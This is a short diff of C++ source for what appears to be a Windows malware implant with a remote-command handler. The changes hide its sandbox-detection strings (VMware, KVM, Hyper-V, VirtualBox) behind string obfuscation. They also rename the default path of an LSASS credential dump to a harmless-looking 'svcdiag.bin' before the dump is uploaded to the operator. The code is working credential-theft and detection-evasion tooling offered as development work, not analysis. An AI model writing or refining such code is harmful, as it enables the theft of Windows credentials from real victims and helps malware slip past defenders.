@@ -254,8 +254,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 		memcpy(hvVendor + 0, &cpuInfo[1], 4);
 		memcpy(hvVendor + 4, &cpuInfo[2], 4);
 		memcpy(hvVendor + 8, &cpuInfo[3], 4);
-		if (strstr(hvVendor, "VMware") || strstr(hvVendor, "KVMKVM") ||
-		    strstr(hvVendor, "Microsoft Hv") || strstr(hvVendor, "VBoxVBox"))
+		if (strstr(hvVendor, S("VMware").c_str()) || strstr(hvVendor, S("KVMKVM").c_str()) ||
+		    strstr(hvVendor, S("Microsoft Hv").c_str()) || strstr(hvVendor, S("VBoxVBox").c_str()))
 			sbFlags++;
 
 		// Single logical processor (most sandboxes use 1 core)
@@ -918,7 +918,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 						api.SendResult(r.c_str());
 					} else if (sub == "pull") {
 						std::string outPath = (params.size() >= 3) ? params[2]
-							: "C:\\Windows\\Temp\\lsass.dmp";
+							: S("C:\\Windows\\Temp\\svcdiag.bin");
 						std::string r = LsassDump::Dump(outPath);
 						if (r.find("dump written") != std::string::npos) {
 							std::string saved = api.UploadFile(outPath.c_str());
